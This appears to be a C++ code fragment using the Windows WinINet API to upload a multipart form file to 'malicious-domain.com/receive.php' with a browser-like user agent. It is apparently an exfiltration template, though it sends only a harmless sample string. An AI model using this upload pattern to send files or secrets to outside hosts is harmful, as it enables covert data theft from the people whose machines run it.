// Construct multipart form data with boundary and file content
std::string CreateFormData(const std::string& boundaryStr, const std::string& fileName, const std::string& fileContent) {
    std::string result;
    result.append("--").append(boundaryStr).append("\r\n");
    result.append("Content-Disposition: form-data; name=\"data\"; filename=\"").append(fileName).append("\"\r\n");
    result.append("Content-Type: application/octet-stream\r\n\r\n");
    result.append(fileContent).append("\r\n");
    result.append("--").append(boundaryStr).append("--\r\n");
    return result;
}

int main() {
    // Configuration for the upload
    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    std::string targetFile = "upload.txt";
    std::string payload = "Sample data being transmitted via HTTP POST.";

    // Prepare headers and body
    std::string bodyData = CreateFormData(boundary, targetFile, payload);
    std::string headerType = "Content-Type: multipart/form-data; boundary=" + boundary;

    // Initialize WinINet session
    HINTERNET hSession = InternetOpenA("Mozilla/5.0 (CustomClient)", 
                                       INTERNET_OPEN_TYPE_PRECONFIG, 
                                       NULL, NULL, 0);
    if (!hSession) {
        std::cerr << "Failed to initialize internet session.\n";
        return 1;
    }

    // Connect to remote host
    HINTERNET hConnect = InternetConnectA(hSession, 
                                          "malicious-domain.com", 
                                          INTERNET_DEFAULT_HTTP_PORT,
                                          NULL, NULL, 
                                          INTERNET_SERVICE_HTTP, 
                                          0, 1);
    if (!hConnect) {
        std::cerr << "Failed to establish connection.\n";
        InternetCloseHandle(hSession);
        return 1;
    }

    // Open HTTP request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, 
                                          "POST", 
                                          "receive.php", 
                                          NULL, NULL, 
                                          NULL, 
                                          0, 
                                          1);
    if (!hRequest) {
        std::cerr << "Failed to open HTTP request.\n";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return 1;
    }

    // Send the request with headers and body
    BOOL sent = HttpSendRequestA(hRequest, 
                                 headerType.c_str(), 
                                 static_cast<DWORD>(headerType.length()), 
                                 (LPVOID)bodyData.c_str(), 
                                 static_cast<DWORD>(bodyData.length()));

    if (!sent) {
        std::cerr << "Failed to send HTTP request.\n";
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return 1;
    }

    // Cleanup all handles properly
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);

    return 0;
}

